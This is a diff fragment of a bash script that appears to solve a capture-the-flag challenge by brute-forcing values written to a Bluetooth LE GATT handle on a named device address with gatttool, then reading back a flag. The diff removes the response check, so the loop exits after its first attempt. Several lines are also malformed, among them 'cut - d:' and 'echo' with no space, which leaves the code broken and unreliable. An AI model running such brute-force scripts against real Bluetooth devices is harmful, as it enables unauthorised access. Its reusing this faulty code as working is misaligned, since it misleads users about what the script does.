@@ -13,11 +13,8 @@
    hex=$(printf "%02x" $i)
    gatttool -b EC:E3:34:1A:EB:B6 --char-write-req -a 0x003c -n $hex 
    response=$(gatttool -b EC:E3:34:1A:EB:B6 --char-read -a 0x003c | cut - d: -f2 | xxd -r -p) 
-   if [[ "$response" != "Brute force"* ]]; then
-   echo"value tried: $hex"
    echo"flag: $response"
    exit 0 
-   fi 
    done 
    
    (just run the file and get the flag)
